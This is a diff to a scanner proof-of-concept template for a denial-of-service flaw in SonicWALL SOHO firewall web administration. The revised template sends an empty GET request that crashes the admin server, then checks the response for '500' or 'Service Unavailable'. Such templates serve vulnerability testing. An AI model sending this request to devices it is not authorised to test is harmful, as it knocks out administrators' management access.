@@ -1,55 +1,28 @@
 [info]
 author = "AVE"
-description = "检测 SonicWALL SOHO Firewall 4.0/5.0 Web 管理服务器是否存在空 GET/POST 请求拒绝服务漏洞。通过发送空 HTTP 请求触发服务处理异常，导致 Web 界面崩溃。"
+description = "向 SonicWALL SOHO Firewall 4.0/5.0 的 Web 管理界面发送空 GET 请求，可导致 Web 服务器进程崩溃，造成管理界面不可用。攻击复杂度低，无需认证，仅需网络访问。"
 id = "POC-AVE-2000-1083"
 name = "SonicWALL SOHO Firewall 空请求拒绝服务漏洞 PoC"
 severity = "medium"
-tags = [
-    "cve-2000-1098",
-    "sonicwall",
-    "soho",
-    "dos",
-]
+tags = ["ave-2000-1083"]
 vuln_id = [
     "CVE-2000-1098",
     "AVE-2000-1083",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
 path = "/{{BaseURL}}/"
 protocol = "http"
 
-[poc.requests.body]
-content = ""
-type = "raw"
-
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "SonicWALL",
-    "SOHO",
-]
-
-[[poc.requests]]
-method = "POST"
-path = "/{{BaseURL}}/"
-protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "SonicWALL",
-    "SOHO",
+    "500",
+    "Service Unavailable",
 ]
